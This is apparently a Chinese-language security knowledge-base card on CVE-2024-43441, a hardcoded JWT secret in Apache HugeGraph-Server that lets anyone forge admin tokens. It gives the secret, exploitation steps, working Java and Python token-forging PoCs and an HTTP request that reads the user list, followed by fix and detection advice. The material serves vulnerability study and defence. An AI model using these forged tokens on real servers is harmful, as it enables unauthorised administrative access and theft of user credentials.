---
id: web-generic-jwt-hugegraph-hardcoded-secret-token-forgery
title: CVE-2024-43441 Apache HugeGraph 硬编码 HS256 密钥：伪造 user_name/user_id 令牌冒充 admin（user_id=-30）读取 /auth/users
type: scenario
domain: web
path: web/generic/jwt
technique: hugegraph-hardcoded-jwt-secret-forgery
aliases:
- CVE-2024-43441
- HugeGraph JWT 硬编码
- FXQXbJtbCLxODc6tGci732pkH1cyf8Qg
- HugeGraph 认证绕过
- TokenGenerator.create 伪造
- admin user_id -30
tags:
- java
- hugegraph
- jwt
- hs256
- hardcoded-secret
- authentication-bypass
- graph-database
- jjwt
cve:
- CVE-2024-43441
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: Apache HugeGraph-Server 1.0 ~ 1.3（before 1.5.0）
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:48:50+08:00'
  notes: 已对照原文核对：硬编码密钥 FXQXbJtbCLxODc6tGci732pkH1cyf8Qg、TokenGenerator 的 hmacShaKeyFor/HS256 签名、payload 仅 user_name+user_id、admin user_id=-30、jjwt 0.11.5、401→200 复现均与原文及截图一致；受影响区间 1.0~1.3(before 1.5.0) 与官方公告一致。未验证点：PyJWT 等价片段为等价改写、未实际执行；卡片标题中的 exp=36000 沿用原文写法（毫秒），实际有效期极短未验证。
---

## 一句话结论

Apache HugeGraph-Server 1.0–1.3 的 `AuthOptions.AUTH_TOKEN_SECRET` 默认值是硬编码字符串 `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg`，`TokenGenerator` 直接用它做 `Keys.hmacShaKeyFor()` 的 HS256 签名密钥；因为 payload 里只有 `user_name` 与 `user_id` 两个 claim，攻击者用该密钥自签 `{"user_name":"admin","user_id":"-30"}` 即可通过 `TokenGenerator.verify()` 冒充管理员，直接调用 `/graphs/hugegraph/auth/users` 等受保护接口。

## 原理

- `StandardAuthManager#loginUser` 生成的 token payload 是 `ImmutableMap.of(AuthConstant.TOKEN_USER_NAME, username, AuthConstant.TOKEN_USER_ID, user.id.asString())`，即只有用户名与用户 ID，没有角色、没有签名来源绑定。
- `TokenGenerator` 构造时读 `config.get(AuthOptions.AUTH_TOKEN_SECRET)` 并 `Keys.hmacShaKeyFor(secretKey.getBytes(UTF_8))`；1.3.0 及更早版本该配置项默认值就是硬编码的 `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg`（32 字节，正好满足 HS256 最小密钥长度，因此不会抛 `WeakKeyException`）。
- `create()` 用 `Jwts.builder().setClaims(payload).setExpiration(...).signWith(this.key, SignatureAlgorithm.HS256).compact()` 签发；`verify()` 用同一个 `key` 验签后直接 `claimsJws.getBody()`，不再做「该 token 是否由本服务下发、是否在 tokenCache 中」的校验。
- 因此只要知道密钥，就能自签任何用户的 token；用户身份由 `user_name`/`user_id` 两个 claim 决定，而 `admin` 的内置 `user_id` 是 `-30`（固定值，不随部署变化）。
- 为什么是「假定不可变数据」类漏洞：签发凭据的唯一秘密是一个写死在源码/默认配置里的常量，且没在启动时强制要求覆盖；任何拿到源码或镜像的人都能离线签发。
- 前提条件：HugeGraph 默认关闭认证（启动后 `/auth/users` 返回 401 是因为需要显式开启），开启后才是本漏洞的利用面；未开启认证时接口本身就没有鉴权，属另一类暴露问题。

## 触发条件

- 目标为 Apache HugeGraph-Server 1.0 ~ 1.3（1.5.0 起改为 `SecureRandom` 生成的 Base64 密钥）。
- 已按官方文档开启认证（`bin/enable-auth.sh` → `bin/init-store.sh` 重建 `rocksdb-data/` → `bin/start-hugegraph.sh`），接口对无 token 请求返回 `401 Missing authentication credentials`。
- `auth.token_secret` 未被显式改成随机值（默认硬编码生效）。
- 攻击者能访问 `http://<host>:8080/graphs/<graph>/auth/users` 等 REST 接口，并知道目标内置 admin 的 `user_id`（`-30`）。

## 利用步骤

1. 探测认证是否开启：`GET /graphs/hugegraph/auth/users` 无 token 时返回 `401` + `jakarta.ws.rs.NotAuthorizedException`，说明鉴权在生效（漏洞可打）。
2. 用硬编码密钥 `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg` 生成 HS256 密钥对象，payload 填 `user_name=admin`、`user_id=-30`，`exp` 设为未来时间。
3. 用 jjwt 0.11.5（与被测版本同族）`compact()` 出 token。
4. 带 `Authorization: Bearer <token>` 重放同一请求；返回 `200` 且包含 `users` 数组（含 `user_password` 哈希、`user_creator` 等）即冒充成功。
5. 用该 token 继续调用其它受保护接口（schema、graph、gremlin 等）做进一步操作。

## PoC

```java
// 与目标同族的 jjwt 0.11.5；未在本机执行
import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class Main {
    public static void main(String[] args) {
        String secretKey = "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg";   // AuthOptions.AUTH_TOKEN_SECRET 默认值
        SecretKey key = Keys.hmacShaKeyFor(secretKey.getBytes(StandardCharsets.UTF_8));
        Map<String, String> payload = new HashMap<>();
        payload.put("user_name", "admin");
        payload.put("user_id", "-30");                          // 内置 admin 的固定 ID
        String token = Jwts.builder()
                .setClaims(payload)
                .setExpiration(new Date(System.currentTimeMillis() + 36000))
                .signWith(key, SignatureAlgorithm.HS256)
                .compact();
        System.out.println(token);
    }
}
```

```http
GET /graphs/hugegraph/auth/users HTTP/1.1
Host: 172.21.160.1:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiLTMwIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJleHAiOjE3MzYyMDQ5Mzl9.<签名>
Cache-Control: max-age=0
# 无 token 时：401 {"exception":"class jakarta.ws.rs.NotAuthorizedException","message":"Authentication credentials are required"}
# 带伪造 token：200 {"users":[{"user_name":"admin","id":"-30:admin","user_creator":"system", ...}]}
```

```python
# 等价的非 Java 方案：PyJWT 直接签同样的 claims
import jwt, time
tok = jwt.encode({"user_name": "admin", "user_id": "-30",
                  "exp": int(time.time()) + 36000},
                 "FXQXbJtbCLxODc6tGci732pkH1cyf8Qg", algorithm="HS256")
```

## 变体与关联

- 变体：payload 换成其它已知 `user_name`/`user_id` 对，冒充普通用户（危害降级但仍绕过认证）；`user_id` 可通过泄露的 `/auth/users` 或图数据枚举。
- 变体：若部署者改了 `auth.token_secret` 但改成弱值（短于 32 字节会触发 jjwt `WeakKeyException`，通常被改成另一串可猜字符串），退化为弱密钥爆破/字典攻击。
- 变体：`TokenGenerator` 只验签不查缓存，等价于「无状态 token + 单一硬编码根密钥」，任何泄露该常量的渠道都被等同视之。
- 关联：[[web-generic-jwt-example-config-hardcoded-secret]]、[[web-generic-jwt-zpan-hardcoded-secret-oss-credential-leak]]、[[web-generic-jwt-go-binary-hardcoded-secret-admin-forgery]]、[[web-generic-jwt-xiaozhi-default-hs256-secret-forgery]]（同一原语「硬编码/默认 HS256 密钥 → 自签 admin」的不同产品实例；本条差异在于 claims 仅 `user_name`+`user_id`、内置 admin 的 `user_id` 是固定 `-30`、且要求先开启认证）。
- 关联：[[binary-pwn-sandbox-escape-hugegraph-gremlin-threadname-securitymanager-bypass]]（同一产品的另一漏洞；本条拿到的是「管理员身份」而非代码执行，可作为其前置认证绕过）。
- 边界：1.5.0+ 改为 `SecureRandom` 生成 32 字节并 Base64 编码的随机密钥，硬编码值失效；若 `auth.token_secret` 已被替换为随机值，除非能从配置/环境泄露获取，否则本条不成立；未开启认证时不需要 token（不属本条）。

## 检测与防御

- 修复：升级到 ≥ 1.5.0（`AuthOptions` 里 `generateRandomBase64Key()` 取代字面量）；升级后确认 `auth.token_secret` 已重新生成，旧 token 全部失效。
- 加固：启动时校验 `auth.token_secret` 不等于默认值/长度不足即拒绝启动；密钥从环境变量或 KMS 注入；为 token 加 `iat`/`jti` 并保留可吊销的服务端记录（`tokenCache` 应参与校验而不是只用于 `logout`）。
- 检测：仓库/镜像扫描 `FXQXbJtbCLxODc6tGci732pkH1cyf8Qg`、`AUTH_TOKEN_SECRET` 常量；运行时检查 `/graphs/*/auth/*` 的 token `user_id`/`user_name` 是否与服务端登录记录匹配；对同一 token 出现在多个来源 IP、或 `exp-iat` 为极短固定值（示例 36000ms）的请求告警。
- 加固（部署侧）：不要把 8080 暴露到公网；开启认证后仍应配合网络层访问控制与审计。
